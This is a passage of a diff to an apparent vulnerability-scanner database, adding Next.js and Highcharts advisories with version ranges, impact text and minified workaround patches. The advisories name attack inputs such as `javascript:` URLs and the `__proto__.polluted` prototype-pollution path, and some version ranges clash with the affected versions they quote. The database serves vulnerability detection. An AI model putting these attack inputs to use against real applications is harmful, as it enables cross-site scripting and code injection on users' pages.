+            "https://github.com/vercel/next.js/security/advisories/GHSA-h694-7cp9-m8p3",
+            "https://github.com/vercel/next.js/commit/e92db4536a7f34ae2dbda583cfa1b4e0d06d1865",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.8"
+          ]
+        },
+        {
+          "atOrAbove": "16.0.0",
+          "below": "16.4.1",
+          "severity": "critical",
+          "cwe": [
+            "CWE-1395"
+          ],
+          "identifiers": {
+            "summary": "Next.js: Unauthenticated Remote Code Execution in Image Optimization API when SVG files are used",
+            "githubID": "GHSA-2464-fhr4-w9xw"
+          },
+          "details": "## Impact\n\nA memory-related vulnerability has been discovered in an upstream library used for Image Optimization can lead to possible remote code execution (RCE) when Next.js runs on glibc-based Linux.\n\n## Workaround\n\nEnsure the version of `sharp` used by Next.js is greater than or equal to `0.35.5`. Fresh installs automatically get a fixed version of `sharp`.\nUpgrading Next.js to the patched versions will ensure package managers automatically provide a fixed version of `sharp` to Next.js.",
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-2464-fhr4-w9xw",
+            "https://github.com/vercel/next.js/commit/5e3b687b5edb868b064bdc058d768a7021e7f6ad",
+            "https://github.com/vercel/next.js/commit/9571ec899f063df6533351bec390ccb2cc0af6a3",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+            "https://github.com/vercel/next.js/releases/tag/v16.4.1"
+          ]
+        },
+        {
+          "atOrAbove": "16.0.0",
+          "below": "16.4.1",
+          "severity": "critical",
+          "cwe": [
+            "CWE-502"
+          ],
+          "identifiers": {
+            "summary": "Next.js: Unauthenticated Remote Code Execution in `use cache` functions returning typed arrays",
+            "githubID": "GHSA-673q-mjm6-r5xr"
+          },
+          "details": "## Impact\n\nA vulnerability in applications using App router with Cache Component can lead to remote code execution. The application needs to have a `use cache` function that returns multiple typed arrays.\n\n## Workaround\n\nThere is no known workaround for affected applications with such `use cache` functions. You should upgrade immediately even if your application does not have similar functions.",
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-673q-mjm6-r5xr",
+            "https://github.com/vercel/next.js/commit/a4cea6aec5da89d116b8960e113189cf51745d2f",
+            "https://github.com/vercel/next.js/releases/tag/v16.4.1"
+          ]
+        },
+        {
+          "atOrAbove": "16.0.0",
+          "below": "16.4.1",
+          "severity": "high",
+          "cwe": [
+            "CWE-770"
+          ],
+          "identifiers": {
+            "summary": "Next.js: Denial of Service in App Router using Server Actions",
+            "githubID": "GHSA-p3m5-59mp-jv5r",
+            "CVE": [
+              "CVE-2026-94482"
+            ]
+          },
+          "details": "## Impact\n\nCrafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process.\n\n## Workarounds\n\nNo workaround exists besides upgrading. Applications using Pages Router or not using Server Actions are not vulnerable.",
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-p3m5-59mp-jv5r",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+            "https://github.com/vercel/next.js/releases/tag/v16.4.1"
+          ]
         }
       ],
       "extractors": {
@@ -14527,6 +15073,328 @@
           "info": [
             "https://security.snyk.io/vuln/SNYK-JS-HIGHCHARTS-1290057"
           ]
+        },
+        {
+          "atOrAbove": "0",
+          "below": "11.4.9",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts: `javascript:` URL in credits.href runs script on click",
+            "githubID": "GHSA-5793-x2q3-c3q7",
+            "CVE": [
+              "CVE-2026-118251"
+            ]
+          },
+          "details": "### Impact\nA `credits.href` value beginning with `javascript:` is assigned to the window location when the credits label is clicked, without being checked against an allowed-scheme list. An attacker who controls the chart configuration can therefore run script in the origin of the page hosting the chart. Exploitation requires that untrusted data reach the chart configuration and that a user click the credits label. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\nDrop-in fix - for any versions affected (5.0.0-13.0.2).\nAdd the below IIFE to run after Highcharts is loaded, but before a chart is created.\n\n```js\n!function(t){if(t&&t.Chart&&!t.Chart.prototype.creditsHrefPatched){var r=t.Chart.prototype,e=r.addCredits;r.addCredits=function(n){var o=t.merge(!0,this.options.credits,n);return o&&o.href&&!c(o.href)&&delete o.href,e.call(this,o)},r.creditsHrefPatched=!0}function c(r){var e=t.AST&&t.AST.allowedReferences||[\"https://\",\"http://\",\"mailto:\",\"/\",\"../\",\"./\",\"#\"];return\"string\"==typeof r&&e.some(function(t){return 0===r.indexOf(t)})}}(Highcharts);\n```\n[Live demo & testing](https://jsfiddle.net/BlackLabel/6a09ws1f/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@ 13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-5793-x2q3-c3q7",
+            "https://github.com/highcharts/highcharts/pull/25315",
+            "https://github.com/highcharts/highcharts/commit/9534773d0f41400aac0945bf8aaebc38dfc72aff",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "6.1.0",
+          "below": "11.4.9",
+          "severity": "high",
+          "cwe": [
+            "CWE-1321"
+          ],
+          "identifiers": {
+            "summary": "Highcharts: dotted series.keys paths write to Object.prototype",
+            "githubID": "GHSA-rmqc-xvr3-v46c",
+            "CVE": [
+              "CVE-2026-118250"
+            ]
+          },
+          "details": "### Impact\nA dot-separated key path taken from `series.keys` is followed without filtering the individual segments. An attacker who controls `series.keys` and the matching point data can use a path such as `__proto__.polluted` to set arbitrary properties on `Object.prototype`. The resulting properties are visible to all JavaScript running in the page, not only to the chart. No user interaction is required beyond rendering the chart.\n\nThe injected properties are inert until other code on the page reads them, so consequences depend on the consuming application.\n\n### Workarounds\nDrop-in fix - for any versions affected (6.1.0-13.0.2). Add the below IIFE to run after Highcharts is loaded.\n\n```javascript\n((H)=>{const X = H.isObject;H.Point.prototype.setNestedProperty = function setNestedProperty(t,e,i){let s=i.split(\".\");return s.some(t=>\"__proto__\"===t||\"constructor\"===t)||s.reduce(function(t,i,s,o){let r=o.length-1===s;return t[i]=r?e:X(t[i],!0)?t[i]:{},t[i]},t),t};})(Highcharts);\n```\n\n[Live demo & testing](https://jsfiddle.net/BlackLabel/z3rbtm7u/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.1`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.1/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-rmqc-xvr3-v46c",
+            "https://github.com/highcharts/highcharts/pull/25313",
+            "https://github.com/highcharts/highcharts/commit/fd4ee8140732618bbe71295aba55398fb1f8fa9e",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "10.0.0",
+          "below": "11.4.9",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts Core: `breadcrumbs.style` keys become SVG event-handler attributes",
+            "githubID": "GHSA-35rr-xwfh-x789",
+            "CVE": [
+              "CVE-2026-118246"
+            ]
+          },
+          "details": "### Impact\nThe breadcrumbs `style` option is applied to the breadcrumb button as SVG attributes rather than as CSS, and the attribute names are not filtered. An attacker who controls the chart configuration can supply keys under `breadcrumbs.style` that name event handlers, and those keys become live handlers on the breadcrumb button, so the attacker's script runs in the origin of the page hosting the chart. The option is reached through `drilldown.breadcrumbs`, `navigation.breadcrumbs` and the `breadcrumbs` option of the treemap, sunburst and treegraph series. Exploitation requires that untrusted data reach the chart configuration and that a user drill down, or traverse into a level of a hierarchical series, so that the breadcrumbs render, and then hover over or activate the breadcrumb button. Charts rendered in styled mode do not apply the option and are not affected. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\nVerified against published bundles on 10.0.0, 11.4.8, 12.3.0 and 13.0.2.\n\nLoad immediately after Highcharts, before any chart is created:\n\n```js\n// Workaround fix for all affected Highcharts versions: 10.0.0-13.0.2\n((H)=>{const S=H.SVGElement.prototype,D=S._defaultSetter;S._defaultSetter=function _defaultSetter(v,k,e){/^on/i.test(k)||D.call(this,v,k,e)};})(Highcharts);\n// End of the workaround fix\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-35rr-xwfh-x789",
+            "https://github.com/highcharts/highcharts/commit/b0fafdaaee7d0cac2ecfeb0eaf37b11cd40594ef",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "10.3.2",
+          "below": "11.4.9",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts Core: `javascript:` URL in an `xlink:href` attribute survives text filtering and reaches exported charts",
+            "githubID": "GHSA-mw4f-gj5x-6xr4",
+            "CVE": [
+              "CVE-2026-116796"
+            ]
+          },
+          "details": "### Impact\nThe filter applied to markup in text options checks `href`, `src` and a few similar attributes against an allowed-scheme list, but accepts `xlink:href` without that check, so an SVG anchor whose `xlink:href` is a `javascript:` URL passes the filter, whether or not the option is rendered with `useHTML`. In the live page the attribute is written without the XLink namespace, so browsers do not treat the anchor as a link there.\n\nThe attribute is preserved verbatim in the chart's serialised output: the SVG produced by the exporting module, including the default SVG download, declares the XLink namespace and contains the anchor, and so does the markup of the chart container. Any document that parses that output again, such as the downloaded SVG opened in a browser or a page that inlines exported or server-rendered chart markup, then holds a working link, and an attacker who controls the chart configuration can thereby run script in the origin of that document when a user activates the link.\n\nExploitation requires that untrusted data reach a text option such as the title, that the chart be exported or its markup be serialised and parsed again, and that a user activate the link.\n\n### Workarounds\nDrop-in fix for all affected versions (10.3.2 - 13.1.0).\n\nAdd the below IIFE to run after Highcharts is loaded, before creating a chart.\n\n```\n!function(t){var e=t&&t.AST;if(e&&\"function\"==typeof e.filterUserAttributes&&!e.xlinkHrefPatched){var r=e.filterUserAttributes,n=Object.prototype.hasOwnProperty;e.filterUserAttributes=function(t){return t&&n.call(t,\"xlink:href\")&&!o(t[\"xlink:href\"])&&delete t[\"xlink:href\"],r.call(this,t)},e.xlinkHrefPatched=!0}function o(t){var r=e.allowedReferences||[\"https://\",\"http://\",\"mailto:\",\"/\",\"../\",\"./\",\"#\"];return\"string\"==typeof t&&r.some(function(e){return 0===t.indexOf(e)})}}(Highcharts);\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.1`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.1/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-mw4f-gj5x-6xr4",
+            "https://github.com/highcharts/highcharts/commit/6cf359fb144aa51fdc105e2b9bbd013439b02c88",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.1"
+          ]
+        },
+        {
+          "atOrAbove": "12.0.0",
+          "below": "12.6.1",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts Core: `breadcrumbs.style` keys become SVG event-handler attributes",
+            "githubID": "GHSA-35rr-xwfh-x789",
+            "CVE": [
+              "CVE-2026-118246"
+            ]
+          },
+          "details": "### Impact\nThe breadcrumbs `style` option is applied to the breadcrumb button as SVG attributes rather than as CSS, and the attribute names are not filtered. An attacker who controls the chart configuration can supply keys under `breadcrumbs.style` that name event handlers, and those keys become live handlers on the breadcrumb button, so the attacker's script runs in the origin of the page hosting the chart. The option is reached through `drilldown.breadcrumbs`, `navigation.breadcrumbs` and the `breadcrumbs` option of the treemap, sunburst and treegraph series. Exploitation requires that untrusted data reach the chart configuration and that a user drill down, or traverse into a level of a hierarchical series, so that the breadcrumbs render, and then hover over or activate the breadcrumb button. Charts rendered in styled mode do not apply the option and are not affected. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\nVerified against published bundles on 10.0.0, 11.4.8, 12.3.0 and 13.0.2.\n\nLoad immediately after Highcharts, before any chart is created:\n\n```js\n// Workaround fix for all affected Highcharts versions: 10.0.0-13.0.2\n((H)=>{const S=H.SVGElement.prototype,D=S._defaultSetter;S._defaultSetter=function _defaultSetter(v,k,e){/^on/i.test(k)||D.call(this,v,k,e)};})(Highcharts);\n// End of the workaround fix\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-35rr-xwfh-x789",
+            "https://github.com/highcharts/highcharts/commit/b0fafdaaee7d0cac2ecfeb0eaf37b11cd40594ef",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "12.0.0",
+          "below": "12.6.1",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts: `javascript:` URL in credits.href runs script on click",
+            "githubID": "GHSA-5793-x2q3-c3q7",
+            "CVE": [
+              "CVE-2026-118251"
+            ]
+          },
+          "details": "### Impact\nA `credits.href` value beginning with `javascript:` is assigned to the window location when the credits label is clicked, without being checked against an allowed-scheme list. An attacker who controls the chart configuration can therefore run script in the origin of the page hosting the chart. Exploitation requires that untrusted data reach the chart configuration and that a user click the credits label. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\nDrop-in fix - for any versions affected (5.0.0-13.0.2).\nAdd the below IIFE to run after Highcharts is loaded, but before a chart is created.\n\n```js\n!function(t){if(t&&t.Chart&&!t.Chart.prototype.creditsHrefPatched){var r=t.Chart.prototype,e=r.addCredits;r.addCredits=function(n){var o=t.merge(!0,this.options.credits,n);return o&&o.href&&!c(o.href)&&delete o.href,e.call(this,o)},r.creditsHrefPatched=!0}function c(r){var e=t.AST&&t.AST.allowedReferences||[\"https://\",\"http://\",\"mailto:\",\"/\",\"../\",\"./\",\"#\"];return\"string\"==typeof r&&e.some(function(t){return 0===r.indexOf(t)})}}(Highcharts);\n```\n[Live demo & testing](https://jsfiddle.net/BlackLabel/6a09ws1f/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@ 13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-5793-x2q3-c3q7",
+            "https://github.com/highcharts/highcharts/pull/25315",
+            "https://github.com/highcharts/highcharts/commit/9534773d0f41400aac0945bf8aaebc38dfc72aff",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "12.0.0",
+          "below": "12.6.1",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts Core: HTML text parsing falls back to unfiltered `innerHTML` during printing",
+            "githubID": "GHSA-65hg-cf3f-5m39",
+            "CVE": [
+              "CVE-2026-118244"
+            ]
+          },
+          "details": "### Impact\nWhen the HTML text parser cannot obtain a document from `DOMParser` because the call throws, it falls back to assigning the raw markup to the `innerHTML` of an element created in the hosting document, and the allow-list is applied only to the resulting DOM afterwards. In Chromium the Trusted Types policy callback that the parser uses throws while a `beforeprint` handler is running, so if the hosting page re-renders the chart from a `beforeprint` handler, every HTML-rendered text option parsed at that moment, such as `useHTML` titles, axis labels and data labels or text set by responsive rules, is inserted unsanitized, and event handlers embedded in that markup run in the origin of the page hosting the chart. Exploitation requires that untrusted data reach the chart configuration, that the hosting page update the chart from a `beforeprint` handler in Chromium, and that printing be started, which the print item of the exporting menu does on its own. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\n**Drop-in fix - for any versions affected (12.0.0-13.0.2).**\nAdd the below IIFE to run after Highcharts is loaded. \n```\n((n)=>{n.AST.prototype.parseMarkup=function parseMarkup(t){let e,i=[];t=t.trim().replace(/ style=([\"'])/g,\" data-style=$1\");try{e=new DOMParser().parseFromString(tI?tI.createHTML(t):t,\"text/html\")}catch{}if(!e)try{e=new DOMParser().parseFromString(t,\"text/html\")}catch{}e||((e=n.doc.implementation.createHTMLDocument(\"\")).body.innerHTML=t);let s=(t,e)=>{let i=t.localName||t.nodeName.toLowerCase(),o={tagName:i};\"#text\"===i&&(o.textContent=t.textContent||\"\");let r=t.attributes;if(r){let t={};[].forEach.call(r,e=>{\"data-style\"===e.name?o.style=tB.parseStyle(e.value):t[e.name]=e.value}),o.attributes=t}if(t.childNodes.length){let e=[];[].forEach.call(t.childNodes,t=>{s(t,e)}),e.length&&(o.children=e)}e.push(o)};return[].forEach.call(e.body.childNodes,t=>s(t,i)),i};})(Highcharts);\n```\n[Live demo & testing](https://jsfiddle.net/BlackLabel/pb6jLf7g/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example npm install highcharts@13.1.0. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example https://code.highcharts.com/13.1.0/highcharts.js. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-65hg-cf3f-5m39",
+            "https://github.com/highcharts/highcharts/commit/abde7c576793bf50b0e0636e59b49630de6dd0d5",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "12.0.0",
+          "below": "12.6.1",
+          "severity": "high",
+          "cwe": [
+            "CWE-1321"
+          ],
+          "identifiers": {
+            "summary": "Highcharts: dotted series.keys paths write to Object.prototype",
+            "githubID": "GHSA-rmqc-xvr3-v46c",
+            "CVE": [
+              "CVE-2026-118250"
+            ]
+          },
+          "details": "### Impact\nA dot-separated key path taken from `series.keys` is followed without filtering the individual segments. An attacker who controls `series.keys` and the matching point data can use a path such as `__proto__.polluted` to set arbitrary properties on `Object.prototype`. The resulting properties are visible to all JavaScript running in the page, not only to the chart. No user interaction is required beyond rendering the chart.\n\nThe injected properties are inert until other code on the page reads them, so consequences depend on the consuming application.\n\n### Workarounds\nDrop-in fix - for any versions affected (6.1.0-13.0.2). Add the below IIFE to run after Highcharts is loaded.\n\n```javascript\n((H)=>{const X = H.isObject;H.Point.prototype.setNestedProperty = function setNestedProperty(t,e,i){let s=i.split(\".\");return s.some(t=>\"__proto__\"===t||\"constructor\"===t)||s.reduce(function(t,i,s,o){let r=o.length-1===s;return t[i]=r?e:X(t[i],!0)?t[i]:{},t[i]},t),t};})(Highcharts);\n```\n\n[Live demo & testing](https://jsfiddle.net/BlackLabel/z3rbtm7u/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.1`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.1/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-rmqc-xvr3-v46c",
+            "https://github.com/highcharts/highcharts/pull/25313",
+            "https://github.com/highcharts/highcharts/commit/fd4ee8140732618bbe71295aba55398fb1f8fa9e",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "12.0.0",
+          "below": "12.6.2",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts Core: `javascript:` URL in an `xlink:href` attribute survives text filtering and reaches exported charts",
+            "githubID": "GHSA-mw4f-gj5x-6xr4",
+            "CVE": [
+              "CVE-2026-116796"
+            ]
+          },
+          "details": "### Impact\nThe filter applied to markup in text options checks `href`, `src` and a few similar attributes against an allowed-scheme list, but accepts `xlink:href` without that check, so an SVG anchor whose `xlink:href` is a `javascript:` URL passes the filter, whether or not the option is rendered with `useHTML`. In the live page the attribute is written without the XLink namespace, so browsers do not treat the anchor as a link there.\n\nThe attribute is preserved verbatim in the chart's serialised output: the SVG produced by the exporting module, including the default SVG download, declares the XLink namespace and contains the anchor, and so does the markup of the chart container. Any document that parses that output again, such as the downloaded SVG opened in a browser or a page that inlines exported or server-rendered chart markup, then holds a working link, and an attacker who controls the chart configuration can thereby run script in the origin of that document when a user activates the link.\n\nExploitation requires that untrusted data reach a text option such as the title, that the chart be exported or its markup be serialised and parsed again, and that a user activate the link.\n\n### Workarounds\nDrop-in fix for all affected versions (10.3.2 - 13.1.0).\n\nAdd the below IIFE to run after Highcharts is loaded, before creating a chart.\n\n```\n!function(t){var e=t&&t.AST;if(e&&\"function\"==typeof e.filterUserAttributes&&!e.xlinkHrefPatched){var r=e.filterUserAttributes,n=Object.prototype.hasOwnProperty;e.filterUserAttributes=function(t){return t&&n.call(t,\"xlink:href\")&&!o(t[\"xlink:href\"])&&delete t[\"xlink:href\"],r.call(this,t)},e.xlinkHrefPatched=!0}function o(t){var r=e.allowedReferences||[\"https://\",\"http://\",\"mailto:\",\"/\",\"../\",\"./\",\"#\"];return\"string\"==typeof t&&r.some(function(e){return 0===t.indexOf(e)})}}(Highcharts);\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.1`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.1/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-mw4f-gj5x-6xr4",
+            "https://github.com/highcharts/highcharts/commit/6cf359fb144aa51fdc105e2b9bbd013439b02c88",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.1"
+          ]
+        },
+        {
+          "atOrAbove": "13.0.0",
+          "below": "13.1.0",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts Core: `breadcrumbs.style` keys become SVG event-handler attributes",
+            "githubID": "GHSA-35rr-xwfh-x789",
+            "CVE": [
+              "CVE-2026-118246"
+            ]
+          },
+          "details": "### Impact\nThe breadcrumbs `style` option is applied to the breadcrumb button as SVG attributes rather than as CSS, and the attribute names are not filtered. An attacker who controls the chart configuration can supply keys under `breadcrumbs.style` that name event handlers, and those keys become live handlers on the breadcrumb button, so the attacker's script runs in the origin of the page hosting the chart. The option is reached through `drilldown.breadcrumbs`, `navigation.breadcrumbs` and the `breadcrumbs` option of the treemap, sunburst and treegraph series. Exploitation requires that untrusted data reach the chart configuration and that a user drill down, or traverse into a level of a hierarchical series, so that the breadcrumbs render, and then hover over or activate the breadcrumb button. Charts rendered in styled mode do not apply the option and are not affected. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\nVerified against published bundles on 10.0.0, 11.4.8, 12.3.0 and 13.0.2.\n\nLoad immediately after Highcharts, before any chart is created:\n\n```js\n// Workaround fix for all affected Highcharts versions: 10.0.0-13.0.2\n((H)=>{const S=H.SVGElement.prototype,D=S._defaultSetter;S._defaultSetter=function _defaultSetter(v,k,e){/^on/i.test(k)||D.call(this,v,k,e)};})(Highcharts);\n// End of the workaround fix\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-35rr-xwfh-x789",
+            "https://github.com/highcharts/highcharts/commit/b0fafdaaee7d0cac2ecfeb0eaf37b11cd40594ef",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "13.0.0",
+          "below": "13.1.0",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts: `javascript:` URL in credits.href runs script on click",
+            "githubID": "GHSA-5793-x2q3-c3q7",
+            "CVE": [
+              "CVE-2026-118251"
+            ]
+          },
+          "details": "### Impact\nA `credits.href` value beginning with `javascript:` is assigned to the window location when the credits label is clicked, without being checked against an allowed-scheme list. An attacker who controls the chart configuration can therefore run script in the origin of the page hosting the chart. Exploitation requires that untrusted data reach the chart configuration and that a user click the credits label. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\nDrop-in fix - for any versions affected (5.0.0-13.0.2).\nAdd the below IIFE to run after Highcharts is loaded, but before a chart is created.\n\n```js\n!function(t){if(t&&t.Chart&&!t.Chart.prototype.creditsHrefPatched){var r=t.Chart.prototype,e=r.addCredits;r.addCredits=function(n){var o=t.merge(!0,this.options.credits,n);return o&&o.href&&!c(o.href)&&delete o.href,e.call(this,o)},r.creditsHrefPatched=!0}function c(r){var e=t.AST&&t.AST.allowedReferences||[\"https://\",\"http://\",\"mailto:\",\"/\",\"../\",\"./\",\"#\"];return\"string\"==typeof r&&e.some(function(t){return 0===r.indexOf(t)})}}(Highcharts);\n```\n[Live demo & testing](https://jsfiddle.net/BlackLabel/6a09ws1f/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@ 13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-5793-x2q3-c3q7",
+            "https://github.com/highcharts/highcharts/pull/25315",
+            "https://github.com/highcharts/highcharts/commit/9534773d0f41400aac0945bf8aaebc38dfc72aff",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "13.0.0",
+          "below": "13.1.0",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts Core: HTML text parsing falls back to unfiltered `innerHTML` during printing",
+            "githubID": "GHSA-65hg-cf3f-5m39",
+            "CVE": [
+              "CVE-2026-118244"
+            ]
+          },
+          "details": "### Impact\nWhen the HTML text parser cannot obtain a document from `DOMParser` because the call throws, it falls back to assigning the raw markup to the `innerHTML` of an element created in the hosting document, and the allow-list is applied only to the resulting DOM afterwards. In Chromium the Trusted Types policy callback that the parser uses throws while a `beforeprint` handler is running, so if the hosting page re-renders the chart from a `beforeprint` handler, every HTML-rendered text option parsed at that moment, such as `useHTML` titles, axis labels and data labels or text set by responsive rules, is inserted unsanitized, and event handlers embedded in that markup run in the origin of the page hosting the chart. Exploitation requires that untrusted data reach the chart configuration, that the hosting page update the chart from a `beforeprint` handler in Chromium, and that printing be started, which the print item of the exporting menu does on its own. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\n**Drop-in fix - for any versions affected (12.0.0-13.0.2).**\nAdd the below IIFE to run after Highcharts is loaded. \n```\n((n)=>{n.AST.prototype.parseMarkup=function parseMarkup(t){let e,i=[];t=t.trim().replace(/ style=([\"'])/g,\" data-style=$1\");try{e=new DOMParser().parseFromString(tI?tI.createHTML(t):t,\"text/html\")}catch{}if(!e)try{e=new DOMParser().parseFromString(t,\"text/html\")}catch{}e||((e=n.doc.implementation.createHTMLDocument(\"\")).body.innerHTML=t);let s=(t,e)=>{let i=t.localName||t.nodeName.toLowerCase(),o={tagName:i};\"#text\"===i&&(o.textContent=t.textContent||\"\");let r=t.attributes;if(r){let t={};[].forEach.call(r,e=>{\"data-style\"===e.name?o.style=tB.parseStyle(e.value):t[e.name]=e.value}),o.attributes=t}if(t.childNodes.length){let e=[];[].forEach.call(t.childNodes,t=>{s(t,e)}),e.length&&(o.children=e)}e.push(o)};return[].forEach.call(e.body.childNodes,t=>s(t,i)),i};})(Highcharts);\n```\n[Live demo & testing](https://jsfiddle.net/BlackLabel/pb6jLf7g/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example npm install highcharts@13.1.0. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example https://code.highcharts.com/13.1.0/highcharts.js. For more on each installation method, see the 